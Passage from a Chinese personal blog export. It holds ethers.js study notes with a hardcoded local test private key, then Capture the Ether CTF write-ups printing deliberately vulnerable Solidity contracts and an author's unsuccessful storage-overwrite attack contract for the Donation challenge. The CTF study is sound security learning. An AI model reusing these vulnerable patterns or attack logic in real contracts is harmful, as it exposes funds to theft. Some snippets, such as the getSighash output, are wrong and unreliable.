5.4.2 获取钱包地址 代码： 123456789101112/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() const address3 = await wallet3.getAddress() // 获取地址console.log(`1. 获取钱包地址`);console.log(`钱包1地址: $&#123;address1&#125;`);console.log(`钱包2地址: $&#123;address2&#125;`);console.log(`钱包3地址: $&#123;address3&#125;`);console.log(`钱包1和钱包3的地址是否相同: $&#123;address1 === address3&#125;`); 运行结果： 5.4.3 获取助记词利用钱包对象的mnemonic成员获取助记词： 1console.log(`钱包1助记词: $&#123;wallet1.mnemonic.phrase&#125;`) 结果： 5.4.4 利用钱包对象的 privateKey 成员获取私钥：1console.log(`钱包2私钥: $&#123;wallet2.privateKey&#125;`) 运行结果： 到ganache上查看： 结果是相同的。 5.4.5 获取钱包在链上的交互次数利用 getTransactionCount()函数获取钱包在链上的交互次数 1234const txCount1 = await wallet1WithProvider.getTransactionCount()const txCount2 = await wallet2.getTransactionCount()console.log(`钱包1发送交易次数: $&#123;txCount1&#125;`)console.log(`钱包2发送交易次数: $&#123;txCount2&#125;`) 运行结果： 到ganache上查看： 5.4.6 发送ETH我们用wallet2给wallet1发送0.001 ETH，并打印交易前后的钱包余额。由于wallet1是新建的随机私钥钱包，因此交易前余额为0，而交易后余额为0.001 ETH。 1234567891011121314151617181920212223242526272829303132333435363738const wallet1 = ethers.Wallet.createRandom();const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);/** * 获取钱包地址 */const address1 = await wallet1.getAddress()const address2 = await wallet2.getAddress() /** * 发送ETH */console.log(&quot; wallet2 给 wallet1 转账0.01ETH&quot;);//交易前余额console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`);// 构建交易请求；to为接收地址，value为ETH数额const TX = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125;// 发送交易，获得收据const recepit = await wallet2.sendTransaction(TX);await recepit.wait();console.log(&quot;receipt =&gt; &quot;,recepit);console.log(&quot;发送后的账户余额&quot;);console.log(`钱包1: $&#123;ethers.utils.formatEther(await wallet1WithProvider.getBalance())&#125; ETH`);console.log(`钱包2: $&#123;ethers.utils.formatEther(await wallet2.getBalance())&#125; ETH`); 运行结果： ethers.js_day036. 合约交互6.1 创建可写Contract变量 声明可写的Contract变量的规则： 1const contract = new ethers.Contract(address, abi, signer) 解读：其中 address 是合约地址，abi是合约的abi接口，singer是wallet对象。声明可写contract需要提供signer，声明可读contract只需要provider 将可读合约转换为可写合约： 1const contract2 = contract.connect(signer) 6.2 合约交互 读合约信息不需要gas。写入合约需要接入合约信息，构建交易，并支付gas。该交易将由整个网络的每个节点以及矿工验证，并改变区块链状态。 合约交互的方法如下： 1234// 发送交易const tx = await contract.METHOD_NAME(args [, overrides])// 等待链上确认交易await tx.wait() 解读代码：其中METHOD_NAME为调用的函数名，args为函数参数，[, overrides]是可以选择传入的数据，包括： gasPrice：gas价格 gasLimit：gas上限 value：调用时传入的ether（单位是wei） nonce：nonce（随机数？） 注：此方法不能获取合约运行的返回值，如若需要获取合约运行你的返回值，要使用Solidity事件记录，然后利用交易收据去查询。 6.3 例子：与本地ganache合约交互 创建provider，wallet变量 123456789&gt;import &#123; ethers &#125; from &quot;ethers&quot;;&gt;// 获取本地的provider&gt;const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);&gt;// 根据私钥创建 wallet对象&gt;const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;&gt;const wallet = new ethers.Wallet(privateKey, provider); 创建可写合约变量，在我自己 domo1.sol中调用4个函数 getSlot0():查找插槽0位置的值； getSlot1():查找插槽1位置的值； getSlot2():查找插槽2位置的值； depoist():转账； balanceOf():查询地址余额。 tips：这里我使用的是方法是传入remix上获取的abi 12345678910111213/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0x5B1557A5AD3cfAC88F3624743BF67baB28723899&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet); 3.调用getSlot0、1、2()三个函数，查看其值 12345678910// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`) 运行结果： 4.查询账户的余额 123456// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`) 运行结果： 5.转账操作，打印交易详情和余额。 123456//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 运行结果： 由于vscode显示数位的问题，使用在remix上查询显示的位数更多 注：对于非pure&#x2F;view函数的调用，会返回交易的信息。如果想知道函数执行过程中合约变量的变化，可以在合约中使用emit输出事件，并在返回的transaction信息中读取事件信息来获取对应的值 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);/** * 创建可写的合约变量 */ // 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo1.abi&quot;).toString());// 在remix上部署的合约地址const contractAddress = &quot;0xf8fe22cA93bD2416a106dFB62168C0D7eBF557FE&quot;;// 声明可写合约const constract = new ethers.Contract(contractAddress,ABI,wallet);/** * 调用合约的函数 */// let slot0 = await provider.getStorageAt(contractAddress,0);let slot0 = await constract.getSlot0();// console.log(slot0);console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();// console.log(slot1);console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();// console.log(slot2);console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);// 需要查询余额的账户let test_address = &quot;0x753f06cD09C531Ef83b84C5147E812519BB65efd&quot;;let balance = await constract.balanceOf(test_address);console.log(`ETH balance is =&gt; $&#123;ethers.utils.formatEther(balance)&#125;`)//转账let balance1 = await provider.getBalance(test_address);console.log(`转账前的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`)constract.depoist(1, test_address);console.log(`转账后的余额为：=&gt; $&#123;ethers.utils.formatEther(balance1)&#125;`) 7.部署合约7.1 合约工厂 ethers.js 创造了合约工厂 ContractFactory类型，方便开发者部署合约。你可以利用合约abi，编译得到的字节码bytecode和签名者变量 singer 来创建合约工厂实例，为部署合约做准备。 1const contractFactory = new ethers.ContractFactory(abi, bytecode, signer); 注：如果合约的构造函数有参数，那么在abi中必须包含构造函数。 在创建好合约工厂之后，可以调用它的deploy函数，并传入合约构造函数的参数args来部署并得到合约实例： 1const contract = await contractFactory.deploy(args) 可以使用两种命令，等待合约部署在链上确认，然后再进行交互 12await contractERC20.deployed()//或者 await contract.deployTransaction.wait() 7.2 例子：部署我自己编写的demo1.sol合约 demo2.sol 代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract demo2 &#123; uint slot0; address slot1; string public slot2; // 初始化一些变量 constructor(uint _slot0, address _slot1, string memory _slot2) payable&#123; slot0 = _slot0; slot1 = _slot1; slot2 = _slot2; &#125; function setSlot0(uint num) public &#123; slot0 = num; &#125; function getSlot0() external view returns(uint)&#123; return slot0; &#125; function setSlot1(address _address) public &#123; slot1 = _address; &#125; function getSlot1() external view returns(address)&#123; return slot1; &#125; function setSlot2(string memory _str) public &#123; slot2 = _str; &#125; function getSlot2() external view returns(string memory)&#123; return slot2; &#125; function depoist(uint _amount, address payable _to) external &#123; uint balance = address(this).balance; require(balance &gt; _amount, &quot;You balance is less than your address(this).balance&quot;); _to.transfer(_amount); &#125; function balanceOf(address _address) external view returns(uint) &#123; return address(_address).balance; &#125;&#125; 创建provider和wallet变量 123456789import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider); 准备demo1合约的字节码和ABI(这里我使用remix生成的ABI)。因为demo2的构造函数含有参数，因此我们需要把它包含再ABI中。合约的字节码可以从remix的编译面板中点击bytecode按钮拷贝下来(为了代码的可读性，将拷贝的字节码新建一个 .code文件存放，获取的时候 使用 fs来读取)，其中”object”字段对应的数据就是字节码。如果部署在链上的合约，你可以在etherscan的Contract页面的Contract Creation Code中找到。 123456789101112131415161718192021222324252627282930313233343536373839 // demo2人类可读abi /** const demo2ABI = [ &quot;constructor(uint _slot0, address _slot1, string memory _slot2) payable&quot;, ....... ] */ // 读取文件的abi const ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString()); // 读取文件的bytecode const byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString(); 3. 创建合约工厂ContractFactory实例 ```js // 创建合约工厂 ContractFactory 实例 const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet); 4. 调用工厂合约的deploy() 函数并填入构造函数的参数，部署demo2合约并获取合约实例。有写常用方法： - `contract.address`获取合约地址， - `contract.deployTransaction`获取部署详情， - `contractERC20.deployed()`等待合约部署在链上确认。 ```js // 利用 factoryDemo2 部署demo2 合约 const gasPrice = await provider.getGasPrice(); const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;; const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction); console.log(`部署得到的合约地址：$&#123;constract.address&#125;`); console.log(&quot;部署合约的交易详情&quot;); console.log(constract.deployTransaction); 调用合约函数 12345678910111213/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`); let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 执行结果： 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥创建 wallet对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey, provider);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.abi&quot;).toString());// 读取文件的bytecodeconst byteCode = fs.readFileSync(&quot;LearningSelf\\\\day03\\\\demo2.code&quot;).toString();// 创建合约工厂 ContractFactory 实例const factoryDemo2 = new ethers.ContractFactory(ABI, byteCode, wallet);// 利用 factoryDemo2 部署demo2 合约const gasPrice = await provider.getGasPrice();const transaction = &#123; value: ethers.utils.parseEther(&#x27;1&#x27;), gasPrice &#125;;const constract = await factoryDemo2.deploy(9,&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;,&quot;biyou&quot;,transaction);console.log(`部署得到的合约地址：$&#123;constract.address&#125;`);console.log(&quot;部署合约的交易详情&quot;);console.log(constract.deployTransaction);/** * 调用合约的函数 */let slot0 = await constract.getSlot0();console.log(`slot0&#x27;s value is =&gt; $&#123;slot0&#125;`);let slot1 = await constract.getSlot1();console.log(`slot1&#x27;s value is =&gt; $&#123;slot1&#125;`);let slot2 = await constract.getSlot2();console.log(`slot2&#x27;s value is =&gt; $&#123;slot2&#125;`);let balance = await constract.balanceOf(&quot;0x643bB521371F66E271937C6365F5812118e58a6D&quot;);console.log(`ETH balance is =&gt; $&#123;balance&#125;`); 8.检索事件 — 很有用8.1 参考博客：请移步 这里8.2 检索事件 可以利用Ethers中合约类型的queryFilter()函数读取合约释放的事件 1const transferEvents = await contract.queryFilter(&#x27;事件名&#x27;,起始区块，结束区块) queryFilter() 包含3个参数，分别是事件名（必填），起始区块（选填），和结束区块（选填）。检索结果会以数组的形式返回。 注：要检索的事件必须包含在合约的abi中。 9. 监听合约事件9.1 监听合约事件 contract.on 在ethersjs中，合约对象有一个contract.on 的监听方法，让我们持续监听合约的事件： 1contract.on(&quot;eventName&quot;, function) contract.on 有两个参数，一个是要监听的事件名称”eventName”，需要包含合约abi中；另一个是我们在事件发生时调用的函数 contract.once 合约对象有一个contract.once的监听方法，让我们只监听一次合约释放事件，它的参数与contract.on一样： 1contract.once(&quot;eventName&quot;,function) 9.2 监听合约示例在这里 —-&gt; here ………………… 10. 事件过滤现阶段的我还不适合考虑这些，日后再学 博客链接 ………………… 11. BigNumber 和 单位转换11.1 BigNumber 在以太坊中，许多计算都对JavaScript整数的安全值（js中最大安全数为9007199254740991）。因此，ethers.js使用BigNumber 类安全地对任何数量级的数字进行数学运算。在ethers.js中，大多数需要返回值的操作将返回BigNumber，而接受值的参数也会接受他们。 BigNumber官方文档 11.2 创建BigNumber实例 可以利用 ethers.BigNumber.from() 函数将string，number，BigNumber等类型转换为BigNumber。 注：超过js最大安全整数的数值将不能转换 1234567const oneGwei = ethers.BigNumber.from(&quot;1000000000&quot;); // 从十进制字符串生成console.log(oneGwei)console.log(ethers.BigNumber.from(&quot;0x3b9aca00&quot;)) // 从hex字符串生成console.log(ethers.BigNumber.from(1000000000)) // 从数字生成// 不能从js最大的安全整数之外的数字生成BigNumber，下面代码会报错// ethers.BigNumber.from(Number.MAX_SAFE_INTEGER);console.log(&quot;js中最大安全整数：&quot;, Number.MAX_SAFE_INTEGER) 运行结果： 11.3 BigNumber运算 BigNumber支持很多运算，例如加减乘除、取模mod，幂运算pow，绝对值abs等运算： 1234567// 运算console.log(&quot;加法：&quot;, oneGwei.add(1).toString())console.log(&quot;减法：&quot;, oneGwei.sub(1).toString())console.log(&quot;乘法：&quot;, oneGwei.mul(2).toString())console.log(&quot;除法：&quot;, oneGwei.div(2).toString())// 比较console.log(&quot;是否相等：&quot;, oneGwei.eq(&quot;1000000000&quot;)) 运行结果： 11. 4 单位转换 以太坊中，1 ethers 等于 10^18wei。下面是一些常用的单位： 在应用中，我们经常将数值在用户可读的字符串（以ether为单位）和机器可读的数值（以wei为单位）之间转换。例如，钱包可以为用户界面指定余额（以ether为单位）和gas价格（以gwei为单位），但是在发送交易时，两者都必须转换成以wei为单位的数值。ethers.js提供了一些功能函数，方便这类转换。 formatUnits(变量, 单位)：格式化，小单位转大单位，比如wei -&gt; ether，在显示余额时很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 123456789101112131415//代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n2. 格式化：小单位转大单位，formatUnits&#x27;);console.log(ethers.utils.formatUnits(oneGwei, 0));// &#x27;1000000000&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, 9));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;ether&quot;));// `0.000000001`console.log(ethers.utils.formatUnits(1000000000, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatEther(oneGwei));// `0.000000001` 等同于formatUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： parseUnits：解析，大单位转小单位，比如ether -&gt; wei，在将用户输入的值转为wei为单位的数值很有用。参数中，单位填位数（数字）或指定的单位（字符串）。 1234567891011121314151617// 3. 解析：大单位转小单位// 例如将ether转换为wei：parseUnits(变量, 单位),parseUnits默认单位是 ether// 代码参考：https://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n3. 解析：大单位转小单位，parseUnits&#x27;);console.log(ethers.utils.parseUnits(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;ether&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 18).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;gwei&quot;).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 9).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseEther(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125; 等同于parseUnits(value, &quot;ether&quot;)console.groupEnd(); 运行结果： 12. CallStaticcallStatic方法是属于ethers.Contract类的编写方法分析，同类的还有populateTransaction和estimateGas方法 12.1 可能失败的交易 在以太坊上交易需要支付昂贵的gas，并且有失败的风险，发送失败的交易并不会把gas返还给你。因此，在发送交易前知道哪些交易可能会失败非常重要。以小狐狸钱包（metamask）为例。 如果交易将失败，小狐狸会告诉你 this transaction may fail，翻译过来就是”这笔交易可能会失败”。当用户看到提示的时候，就可以取消交易了。 实现的原理：以太坊节点有一个eth_call方法，让用户可以模拟一笔交易，并返回可能的交易结果，但不是真正的在区块链上执行（交易不上链）。 12.2 callStatic 在ethers.js中你可以利用contract对象的callStatic()来调用以太坊节点的eth_call。如果调用成功，则返回ture；如果失败，则报错并返回失败原因。方法： 12const tx = await contract.callStatic.函数名( 参数, &#123;override&#125;)console.log(`交易会成功吗？：`, tx) 函数名：为模拟调用的函数名。 参数：调用函数的参数。 {override}：选填，可包含一下参数： from：执行时的msg.sender，也就是你可以模拟任何一个人的调用，比如V神。 value：执行时的msg.value。 blockTag：执行时的区块高度。 gasPrice gasLimit nonce 12.3 用callStatic 模拟DAI转账演示过程—-》博客 13. 编码 calldata13.1 接口类Interface ethers.js 的接口类抽象了与以太坊网络的合约交互所需的ABI编码和解码。ABI与API类似，是一格式，用于对合约可以处理的各种类型的数据进行编码，以便它们可以交互。 可以利用abi生成或者直接从合约中获取interface变量： 1234// 利用abi生成const interface = new ethers.utils.Interface(abi)// 直接从contract中获取const interface2 = contract.interface 接口类封装了一些编码解码的方法。与一些特殊的合约交互时（比如代理 合约），你需要编码参数、解码返回值： 注：相关函数必须包含在abi中。 getSighash():获取函数选择器（function selector），参数为函数名或函数签名。 至于函数签名如何获取，在remix上使用keccak256()或的和ethersjs使用keccak256()获取的结果完全不一样，日后空闲了再仔细深入学习 12interface.getSighash(&quot;balanceOf&quot;);// &#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27; encodeDeploy()：编码构造器的参数，然后可以附在合约字节码的后面。 1interface.encodeDeploy(&quot;Wrapped ETH&quot;, &quot;WETH&quot;); encodeFunctionData()：编码函数的calldata。 1interface.encodeFunctionData(&quot;balanceOf&quot;, [&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;]); decodeFunctionResult()：解码函数的返回值。 1interface.decodeFunctionResult(&quot;balanceOf&quot;, resultData)","categories":[{"name":"Ethers.js","slug":"Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/"},{"name":"Basic_Knowledge","slug":"Ethers-js/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Ethers-js/Basic-Knowledge/"}],"tags":[{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"}]},{"title":"Public Key","slug":"Smart contracts/capther the ether/Public Key","date":"2023-04-24T07:50:10.000Z","updated":"2023-04-24T07:50:10.000Z","comments":true,"path":"2023/04/24/Smart contracts/capther the ether/Public Key/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/Smart%20contracts/capther%20the%20ether/Public%20Key/","excerpt":"","text":"Public Key1. 题目2. 分析3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fuzzy identity","slug":"Smart contracts/capther the ether/Fuzzy identity","date":"2023-04-17T02:50:10.000Z","updated":"2023-04-17T02:50:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fuzzy identity/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fuzzy%20identity/","excerpt":"","text":"Fuzzy identity1. 题目 1.1 This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work: I always use a wallet contract that returns “smarx” if you ask its name. Everything I write has bad code in it, so my address always includes the hex string badc0de. To complete this challenge, steal my identity! 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32(&quot;smarx&quot;); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;; bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 2. 分析 2.1 分析代码可知，要是 isComplete的值为 true 需要成功调用 authenticate函数 2.2 但是需要通过两层校验，第一层简单，直接按要求编写一个名为name的函数皆可，第二个函数要求传入的地址是以 badc0de 结尾的，我在这里想到了使用 create2 的方法来构造一个以 badc0de结尾的地址，但是我有想法暂时还不能实现。。。。纠结：web3.utils.soliditySha3(param1 [, param2, ...]) 和 web3.utils.sha3(string) 看了网上大佬使用create2解法的更迷惑了 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fifty years","slug":"Smart contracts/capther the ether/Fifty years","date":"2023-04-17T02:30:10.000Z","updated":"2023-04-17T02:30:10.000Z","comments":true,"path":"2023/04/17/Smart contracts/capther the ether/Fifty years/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/Smart%20contracts/capther%20the%20ether/Fifty%20years/","excerpt":"","text":"Fifty years1. 题目 1.1 This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later. All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374pragma solidity ^0.4.21;contract FiftyYearsChallenge &#123; // Contribution 结构体中包含了 金额和解锁时间 struct Contribution &#123; uint256 amount; uint256 unlockTimestamp; &#125; // Contribution 类型的数组 Contribution[] queue; uint256 head; address owner; function FiftyYearsChallenge(address player) public payable &#123; require(msg.value == 1 ether); // 初始化合约所有者为玩家，并把玩家的钱锁起来，直到五十年之后才可以解锁 owner = player; queue.push(Contribution(msg.value, now + 50 years)); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function upsert(uint256 index, uint256 timestamp) public payable &#123; // 校验调用者是否为合约所有者 require(msg.sender == owner); // if (index &gt;= head &amp;&amp; index &lt; queue.length) &#123; // Update existing contribution amount without updating timestamp. // 这里storage 修饰的是创建的引用，修改contribution 的值也会影响到 queue[index]的值 Contribution storage contribution = queue[index]; // 盲猜这里有漏洞，覆盖 contribution.amount += msg.value; &#125; else &#123; // Append a new contribution. Require that each contribution unlock // at least 1 day after the previous one. require(timestamp &gt;= queue[queue.length - 1].unlockTimestamp + 1 days); contribution.amount = msg.value; contribution.unlockTimestamp = timestamp; queue.push(contribution); &#125; &#125; function withdraw(uint256 index) public &#123; require(msg.sender == owner); // 确保现在的时间大于或等于解锁时间 require(now &gt;= queue[index].unlockTimestamp); // Withdraw this and any earlier contributions. uint256 total = 0; for (uint256 i = head; i &lt;= index; i++) &#123; total += queue[i].amount; // Reclaim storage. delete queue[i]; &#125; // Move the head of the queue forward so we don&#x27;t have to loop over // already-withdrawn contributions. head = index + 1; msg.sender.transfer(total); &#125;&#125; 2. 分析3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"capther the ether","slug":"Smart-contracts/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/capther-the-ether/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Donation","slug":"Smart contracts/capther the ether/Donation","date":"2023-04-14T02:20:10.000Z","updated":"2023-04-14T02:20:10.000Z","comments":true,"path":"2023/04/14/Smart contracts/capther the ether/Donation/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/14/Smart%20contracts/capther%20the%20ether/Donation/","excerpt":"","text":"Donation1. 题目 1.1 A candidate you don’t like is accepting campaign contributions via the smart contract below. To complete this challenge, steal the candidate’s ether. 1.2 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.4.21;contract DonationChallenge &#123; struct Donation &#123; uint256 timestamp; uint256 etherAmount; &#125; Donation[] public donations; address public owner; function DonationChallenge() public payable &#123; require(msg.value == 1 ether); owner = msg.sender; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function donate(uint256 etherAmount) public payable &#123; // amount is in ether, but msg.value is in wei uint256 scale = 10**18 * 1 ether; require(msg.value == etherAmount / scale); Donation donation; donation.timestamp = now; donation.etherAmount = etherAmount; donations.push(donation); &#125; function withdraw() public &#123; require(msg.sender == owner); msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 本题的通过要求就是需要我们将合约中的钱全部偷走，合约中能够进行转钱操作的只有withdraw函数，所以我们只有将 require(msg.sender == owner) 这个校验通过才可以将合约中所有的钱转走 2.2 合约中有结构体，这点需要注意，分析源码可知 slot0 的位置存储的是 donations（里面具体的元素的存储位置在哪，之前遇到过，推荐文献），slot1 的位置存储的是 owner；但在函数donate 中 有一个为指明存储方式的声明语句Donation donation，这个结构体的声明默认是 storage 类型的，是需要上链的，当调用此函数的时候，会覆盖其他全局变量的插槽。 2.3 这恰好为我们篡改合约所有权提供了可能性，只要将 slot1位置的值覆盖为我们自己的账户地址即可成功执行withdraw函数了 2.4 需要在 donate 函数中修改 slot1的值，通过简单的数学计算就可以了 我不知道为什么我的这个攻击合约不行 1234567891011121314151617181920212223242526272829contract Hack &#123; DonationChallenge challenge; uint256 public etherAmount; function Hack(DonationChallenge _challenge) public &#123; challenge = _challenge; &#125; function computer(uint256 _address) public returns(uint256) &#123; // 记录下我的地址，并赋值给etherAmount，方便函数的调用 etherAmount = _address; //算出我要支付多少wei return (_address / (10 ** 36)); &#125; function att() public payable &#123; //修改slot1 即 owner的值 challenge.donate(etherAmount); // 偷钱 challenge.withdraw; &#125; function getAddress() external view returns(address) &#123; return msg.sender; &#125;&#125; tips：问了同学才知道原因：①是因为没给题目合约中的donate函数发送主币，过不了donation中的语句 ②withdraw函数中的 require(msg.sender == owner);校验过不去，因为在智能合约中，谁调用withdraw，谁就是msg.sender;合约调用，那么msg.sender就是合约 这样一来 challenge.withdraw; 